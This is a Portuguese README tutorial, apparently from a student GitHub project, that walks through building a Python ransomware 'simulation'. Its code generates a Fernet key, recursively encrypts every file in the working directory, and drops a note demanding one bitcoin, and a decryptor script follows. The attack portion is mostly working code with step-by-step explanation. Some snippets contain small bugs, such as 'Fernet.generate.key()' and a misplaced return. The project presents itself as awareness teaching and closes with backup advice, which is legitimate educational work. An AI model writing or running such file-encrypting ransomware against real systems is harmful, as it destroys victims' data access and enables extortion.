# Simulação de malware de captura de dados usando python
![Ransomware template](Ransomware_template.jpg)
[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
[![Python Badge](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)]()

## Sobre O Projeto
Guia descrevendo uma simulação de captura de dados através de malware usando python.

## Ferramentas necessárias
Ambiente de desenvolvimento(esse projeto usa vim, mas fica a gosto pessoal, sendo necessário adaptar as partes para que se encaixem no caso específico)
+ vim
  + Arch linux: ````sudo pacman -S vim````
  + Debian/Ubuntu: ````sudo apt update && sudo apt install vim -y````
  + Fedora: ````sudo dnf install vim````
  + Windows: https://www.vim.org/download.php
+ python 3
  +
  +
+ dados_confidenciais.txt
+ senhas.txt

💡 **Sugestão:** habilite o destaque de sintaxe do vim usando ````:syntax on```` no modo normal

💡 **Sugestão:** habilite o número de linhas do vim usando ````:set number```` no modo normal

é possível habilitar de forma permanente da seguinta forma

`vim ~./vimrc`

entre no modo de inserção e escreva no arquivo

`"Habilita o numero de linhas`

`set number`

`"habilita sintaxe`

`syntax on`

volte para o modo normal do vim e carregue o arquivo com as configurações

`:source ~/vimrc`

## Ataque de ransomware

![Explicação do primeiro bloco de código](Images/00_Gerar_uma_chave_de_criptografia.png)

importa o módulo fernet da biblioteca de criptografia

`from cryptography.fernet import Fernet`

importa a biblioteca os para manipulação de operações do sistema operacional

`import os`

cria a função gerar chave

`def gerar_chave():`

associa o método de geração de chave do fernet que gera uma chave de 32 bytes com codificação base64

`chave = Fernet.generate.key()`

declaração para lidar com a abertura do arquivo "chave.key" em modo de apenas leitura(w) em formato binário(wb)

usa a função de abertura de arquivo como "chave_file" para escrever o contéudo da variável "chave" no arquivo "chave_key"

```
with open("chave.key", "wb") as chave_file:
    chave_file.write(chave)
```

![Explicação do segundo código de bloco](Images/01_Carregar_a_chave_salva.png)

cria a função carregar chave

`def carregar_chave():`

retorna o valor do arquivo que será aberto como apenas leitura(r) em formato binário(b) pela função open e terá seu conteúdo lido pela função open

`return open("chave.key", "rb").read()`

![Explicação do terceiro código de bloco](Images/02_Criptografar_um_unico_arquivo.png)

Cria a função criptografar arquivo com dois parâmetros(arquivo e chave)

`def criptografar_arquivo(arquivo, chave):`

cria a instância fernet

`f = Fernet(chave)`

ler o arquivo original

```
with open(arquivo, "rb") as file:
   dados = file.read()
```

criptografa o conteúdo da variável dados

`dados_encriptados = f.encrypt(dados)`

criptografa os dados originais

```
with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
```


![Explicação do quarto código de bloco](Images/03_Encontrar_arquivos_para_criptografar.png)

cria função de encontrar arquvios

`def encontrar_arquivos(diretorio):`

cria um array vázio

`lista = []`

cria um loop for que lê os arquivos e pastas do diretório a partir da função os.walk, além de garantir que o arquivo "ransomware.py" e arquivos com extensão ".key" não faça parte da lista. 

```
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
        return lista
```

![Explicação do quinto código de bloco](Images/04_Mensagem_de_resgate.png)

```
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Enviar 1 bitcoin para o enderço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para recuperar seus dados!\n")
```



![Explicação do sexto código de bloco](Images/05_Execucao_principal.png)

```
def main():
    gerar_chave()
    chave = carregar_chave()
    diretorio = os.getcwd()
    arquivos = encontrar_arquivos(diretorio)
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados!")
```

![Explicação do sexto código de bloco](Images/06_Execucao_do_programa.png)

Verifica se o script está sendo executado como principal ou está sendo importando como módulo

```
if __name__ == '__main__':
    main()

```
⚠️ **Aviso:** Se estiver usando linux, terá que dar permissão de execução para o programa

`sudo chmod u+x <arquivo.py>`

o conteúdo do arquivo fica a critério do próprio usuário, apesar de estar disponível um exemplo para ser usado.

![Arquivo de usuário antes de ser criptografado](Images/07_Dados_confidenciais_antes_do_ataque.png)

![Arquivo de senha antes de ser criptografado](Images/08_Senhas_antes_do_ataque.png)

⚠️ **Aviso:** por causa do código da variável "diretório" no main, os arquivos serão criptografados na pasta que o programa foi executado. Se tiver arquivos importantes nessa pasta, faça backup antes de executar.

execute o programa ransomware

`python ./<nome_do_arquivo.py>`

![Arquivo de usuário antes de ser criptografado](Images/09_Executando_ransomware.png)

com a execução do programa, o arquivo "chave.key" e "LEIA ISSO.txt" serão criados

![Arquivo criados na pasta](Images/10_Ransomware_demonstracao.png)

abrindo os arquivos é possível ver que eles se encontram criptografados

![Arquivo de usuário criptografado](Images/11_Dados_confidenciais_criptografados.png)

![Arquivo de senha criptografado](Images/12_Senhas_criptografadas.png)

![Arquivo leia_isso](Images/13_leia_isso_arquivo.png)

## Descriptografando os arquivos

⚠️ **Aviso:** Parte da lógica desse programa segue a mesma lógica do primeiro, sendo necessário estar na mesma pasta dos arquivos que vão ser descriptografados.

![Explicação_do_primeiro_código_de_bloco](Images/14_Carregar_chave_descriptografia.png)

```
from cryptography.fernet import Fernet   
import os
```

📋**Código repetido:** a explicação para essa parte já foi dada anteriormente

```
def carregar_chave():
    return open("chave.key", "rb").read().strip()
```

lê o arquivo "chave.key" criado pelo software de criptografia(ransomware)

![Explicação_do_segundo_código_de_bloco](Images/15_Descriptografar_arquivos.png)

`def descriptografar_arquivo(arquivo,chave):`

cria a função descriptografar arquivo

`f = Fernet(chave)`

cria uma instância para permitir os métodos da classe Fernet da biblioteca de criptografia  

```
with open(arquivo, "rb") as file:
  dados = file.read().strip()
  dados_descriptografados = f.decrypt(dados)
```
lê os conteúdos dos arquivos criptografados e os descriptografa usando a variável "dados descriptografados" 

```
with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)
```

reescreve o conteúdo do arquivo para a versão descriptografada 

![Explicação_do_terceiro_código_de_bloco](Images/16_Encontrar_arquivos_descriptografia.png)

`def encontrar_arquivos(diretorio):`

cria a função encontrar arquivos

![Explicação_do_quarto_código_de_bloco](Images/17_Execucao_principal.png)

```
lista = []
  for raiz, _, arquivos in os.walk(diretorio):
    for nome in arquivos:
      caminho = os.path.join(raiz, nome)
      if nome != "ransomware.py" and nome != "LEIA ISSO.txt" and nome != "descriptografar.py" and not nome.endswith(".key"):
        lista.append(caminho)
  return lista
```

cria uma lista vazia, percorre todos os arquivos do diretório de forma recursiva e ignora os arquivos "ransmoware.py", "LEIA ISSO.txt", "descriptografar.py" e arquivos com extensão ".key" e adiciona o resto dos arquivos na lista.

![Explicação_do_quinto_código_de_bloco](Images/18_Execucao_do_programa.png)

`def main():`

cria a função main

```
    chave = carregar_chave()
    diretorio = os.getcwd()
    arquivos = encontrar_arquivos(diretorio)
    for arquivo in arquivos: 
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")
```

❗**Complicação**: criei a variável diretório por ter tido problema com os caminhos do diretório, porém se o for fixo o nome e não tiver algum tipo de problema ao ler esse nome, pode só deixar o nome do diretório entre aspas.

📋**Código repetido:** a explicação para essa parte já foi dada anteriormente

```
if __name__ == "__main__":
    main()
```

📋**Código repetido:** a explicação para essa parte já foi dada anteriormente

![Colocando_o_programa_na_pasta](Images/19_Colocando_o_programa_na_pasta.png)

![Executando_descriptografia](Images/20_Executando_descriptografia.png)

## Conclusão
Como um usuário ou empregado que trabalha como informações sensíveis e sigilosas, é importante manter backups frequentes dos seus dados relevantes, isso pode evitar o cenário de ficar refém dessas informações.
